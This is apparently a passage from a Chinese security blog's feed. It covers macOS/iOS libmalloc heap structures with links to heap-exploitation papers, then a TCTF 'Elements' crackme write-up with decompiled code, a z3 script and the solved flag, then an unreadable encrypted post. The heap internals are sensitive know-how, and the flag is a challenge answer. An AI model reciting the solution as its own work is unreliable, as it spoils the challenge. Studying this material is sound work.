&quot;death row&quot;, optimizes malloc/free/malloc for identical size.    void *mag_last_free;    msize_t mag_last_free_msize;    // msize for mag_last_free#if MALLOC_TARGET_64BIT    uint32_t _pad;#endif    region_t mag_last_free_rgn; // holds the region for mag_last_free    free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS];    uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS];    // the first and last free region in the last block are treated as big blocks in use that are not accounted for    size_t mag_bytes_free_at_end;    size_t mag_bytes_free_at_start;    region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0    // bean counting ...    size_t mag_num_bytes_in_objects;    size_t num_bytes_in_magazine;    unsigned mag_num_objects;    // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria    // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria.    // Doubly linked list for efficient extraction.    unsigned recirculation_entries;    region_trailer_t *firstNode;    region_trailer_t *lastNode;#if MALLOC_TARGET_64BIT    uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS -            (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2];#else    uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS -            MAGAZINE_FREELIST_BITMAP_WORDS];#endif} magazine_t;</code></pre><h5 id="tiny-region-t-magazine-zone-h"><a href="#tiny-region-t-magazine-zone-h" class="headerlink" title="tiny_region_t //magazine_zone.h"></a>tiny_region_t //magazine_zone.h</h5><pre><code class="c">/* * Layout of a tiny region */typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t))typedef struct tiny_header_inuse_pair {    uint32_t header;    uint32_t inuse;} tiny_header_inuse_pair_t;typedef struct region_trailer {    struct region_trailer *prev;    struct region_trailer *next;    boolean_t recirc_suitable;    volatile int pinned_to_depot;    unsigned bytes_used;    mag_index_t mag_index;} region_trailer_t;#define NUM_TINY_BLOCKS 64520typedef struct tiny_region {    tiny_block_t blocks[NUM_TINY_BLOCKS];    region_trailer_t trailer;    // The interleaved bit arrays comprising the header and inuse bitfields.    // The unused bits of each component in the last pair will be initialized to sentinel values.    tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS];    uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE];} * tiny_region_t;</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="http://phrack.org/issues/63/5.html" target="_blank" rel="external">http://phrack.org/issues/63/5.html</a></p></li><li><p><a href="https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf" target="_blank" rel="external">https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf</a></p></li><li><p><a href="https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf</a></p></li><li><p><a href="https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html" target="_blank" rel="external">https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html</a></p></li><li><p>&lt;&lt;<a href="https://repo.zenk-security.com/Magazine%20E-book/The%20Mac%20Hacker&#39;s%20Handbook.pdf" target="_blank" rel="external">the Mac Hacker’s Handbook</a>&gt;&gt; 第8章Exploiting Heap Overflows</p></li><li><p><a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">https://opensource.apple.com/source/libmalloc/</a> 源代码</p></li><li><p><a href="http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf" target="_blank" rel="external">http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码解读macOS-iOS-Heap&quot;&gt;&lt;a href=&quot;#源码解读macOS-iOS-Heap&quot; class=&quot;headerlink&quot; title=&quot;源码解读macOS/iOS Heap&quot;&gt;&lt;/a&gt;源码解读macOS/iOS Heap&lt;/h3&gt;&lt;blockquo
      
    
    </summary>
    
      <category term="OS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/OS/"/>
    
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>TCTF-Elements</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/</id>
    <published>2019-03-27T07:13:30.000Z</published>
    <updated>2019-03-28T07:06:17.336Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TCTF-Elements"><a href="#TCTF-Elements" class="headerlink" title="TCTF-Elements"></a>TCTF-Elements</h4><blockquote><p>这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。</p></blockquote><h4 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h4><p>下面是main函数伪代码</p><pre><code class="c">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v3; // bl  const __int32_t **v4; // rax  char *v5; // rcx  size_t v6; // rcx  signed __int64 result; // rax  char *v8; // r12  signed __int64 v9; // r14  char v10; // bl  signed __int64 v11; // rax  const unsigned __int16 *v12; // rcx  signed __int64 v13; // rdx  __int64 v14; // rsi  unsigned __int16 v15; // bx  signed __int64 v16; // rsi  __m128i v17; // xmm0  char *v18; // rax  double v19; // xmm2_8  double v20; // xmm0_8  double v21; // xmm2_8  double v22; // xmm3_8  double v23; // [rsp+20h] [rbp-148h]  double v24; // [rsp+28h] [rbp-140h]  double v25; // [rsp+30h] [rbp-138h]  char s[8]; // [rsp+40h] [rbp-128h]  char v27; // [rsp+6Bh] [rbp-FDh]  fgets(s, 256, stdin);  v3 = s[0];  if ( s[0] )  {    v4 = __ctype_tolower_loc();    v5 = &amp;s[1];    do    {      *(v5 - 1) = (*v4)[v3];      v3 = *v5++;    }    while ( v3 );  }  v6 = strlen(s);  result = 0LL;  if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 )  {    v27 = 0;    v8 = strtok(&amp;s[5], &quot;-&quot;);    v9 = 0LL;    if ( v8 )    {      while ( strlen(v8) == 12 )      {        v10 = *v8;        v11 = 0LL;        if ( *v8 )        {          v12 = *__ctype_b_loc();          v13 = 1LL;          v11 = 0LL;          do          {            v14 = v10;            v15 = v12[v10];            if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 )            {              v16 = v14 - 87;            }            else            {              if ( !(v15 &amp; 0x800) )                goto LABEL_31;              v16 = v14 - 48;            }            v11 = v16 | 16 * v11;            if ( v13 &gt; 11 )              break;            v10 = v8[v13++];          }          while ( v10 );        }        if ( !v9 &amp;&amp; v11 != 62791383142154LL )          break;        v17 = (__m128i)_mm_sub_pd(                         (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),                         (__m128d)xmmword_400BE0);        *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;        v18 = strtok(0LL, &quot;-&quot;);        v8 = v18;        if ( v9 &gt; 2 || !v18 )        {          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }          return 0LL;        }      }    }LABEL_31:    result = 0xFFFFFFFFLL;  }  return result;}</code></pre><p>这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。</p><p>分析可得到需要输入以下格式<code>flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}</code></p><p>这里通过<code>-</code>分割成三个部分，其中第一部分是已知的<code>391bc2164f0a</code>，后面就是程序验证逻辑</p><pre><code class="c">          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }</code></pre><p>当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式</p><p>$c&gt;b,b&gt;a,a+b&gt;c$</p><p>$p=\frac{\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$</p><p>$q=\frac{abc}{(\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$</p><p>$-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $</p><p>但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3</p><pre><code class="python">from z3 import *x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)z = Real(&#39;z&#39;)m = Real(&#39;m&#39;)n = Real(&#39;n&#39;)p = Real(&#39;p&#39;)q = Real(&#39;q&#39;)solver = Solver()m = x*x+y*y-z*zn = (4.0*x*x*y*y-m*m)**0.5*0.25p = 2*n/(x+y+z) + (-1.940035480806554296875E13)q = x*y*z/(4.0*n) + (-4.777053952827391e13)solver.add(z &gt; y)solver.add(y &gt; x)solver.add(x + y &gt; z)solver.add(p &gt; -100,p&lt;100)solver.add(q &gt; -100,q&lt;100)solver.add(x == 6.2791383142154e13)if solver.check() == sat:    print(solver.model())else:    print(&#39;unsolve&#39;)</code></pre><p>结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因</p><p>下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式</p><p>$$Rr=\frac{abc}{2(a+b+c)}$$</p><p>$$tan\frac{C}{2} = \frac{2r}{a+b-c} = \frac{sinC}{1+cosC}$$</p><p>这里$sinC,cosC,R,r,c$都是已知的</p><p>所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$</p><p>得到对应的浮点数表示4064e4798769,56e0de138176</p><pre><code class="assembly">movq    xmm0, raxpunpckldq xmm0, xmmword ptr cs:qword_400BD0subpd   xmm0, cs:xmmword_400BE0pshufd  xmm1, xmm0, 4Ehaddpd   xmm1, xmm0movlpd  [rsp+r14*8+168h+var_148], xmm1</code></pre><p>在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊</p><pre><code>qword_400BD0=0x4530000043300000xmmword_400BE0=0x45300000000000004330000000000000</code></pre><p>punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分</p><p>然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。</p><p>所以其实这里的变换等于没有变换。</p><p>所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176</p><p>最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176}</p><h4 id="补充：浮点数表示、运算、指令"><a href="#补充：浮点数表示、运算、指令" class="headerlink" title="补充：浮点数表示、运算、指令"></a>补充：浮点数表示、运算、指令</h4><p>浮点数有单精度和双精度之分，float占4个字节，double占8个字节</p><p>在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^s<em>M</em>2^E$</p><p>e等于向左或向右移动到1为止的个数</p><p>比如：12.25   对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$</p><p>下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位）</p><p>符号位0，指数3，尾数10001(第一位默认为1不需要表示)</p><p>由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数</p><p>其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示<code>10000000+11-1=10000010</code></p><p>最后12.15单精度浮点数表示为：<code>0 10000010 10001000000000000000000</code> </p><p>十六进制：<code>0x41440000</code> 内存中小端表示：<code>00 00 44 41</code></p><table><thead><tr><th style="text-align:center">Float/Double</th><th style="text-align:center">符号位</th><th style="text-align:center">指数</th><th style="text-align:center">尾数</th><th style="text-align:left">示例</th><th style="text-align:left">16进制</th></tr></thead><tbody><tr><td style="text-align:center">Float</td><td style="text-align:center">1位</td><td style="text-align:center">8位</td><td style="text-align:center">23位</td><td style="text-align:left">0 10000010 10001000000000000000000</td><td style="text-align:left">41440000</td></tr><tr><td style="text-align:center">Double</td><td style="text-align:center">1位</td><td style="text-align:center">11位</td><td style="text-align:center">52位</td><td style="text-align:left">0 10000000010 1000100000000000000000000000 000000000000000000000000</td><td style="text-align:left">4028800000000000</td></tr></tbody></table><p>特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。</p><p>在线转换<a href="http://www.binaryconvert.com/" target="_blank" rel="external">http://www.binaryconvert.com/</a> </p><p>浮点数在进行加减运算的时候需要先对阶然后尾数部分运算</p><p>浮点数指令查询<a href="https://asm.inightmare.org/opcodelst/index.php" target="_blank" rel="external">https://asm.inightmare.org/opcodelst/index.php</a></p><p>这里解释下<code>pshufd  xmm1, xmm0, 4Eh</code>指令</p><p><code>pshufd</code>可以按照指定的方式重新排列数据</p><p>这里4E二进制<code>01 00 11 10</code></p><table><thead><tr><th>寄存器</th><th>值</th></tr></thead><tbody><tr><td>xmm0</td><td>42cc8d80 00000000 41e842c9 e1400000</td></tr><tr><td>4E</td><td>01               00                 11               10</td></tr><tr><td>xmm1</td><td>41e842c9 e1400000 42cc8d80 00000000</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;TCTF-Elements&quot;&gt;&lt;a href=&quot;#TCTF-Elements&quot; class=&quot;headerlink&quot; title=&quot;TCTF-Elements&quot;&gt;&lt;/a&gt;TCTF-Elements&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;这道题其实是一个数学问题，
      
    
    </summary>
    
      <category term="ctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/ctf/"/>
    
    
      <category term="tctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"/>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>idapython learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/</id>
    <published>2019-03-07T11:42:24.000Z</published>
    <updated>2019-03-07T11:44:09.226Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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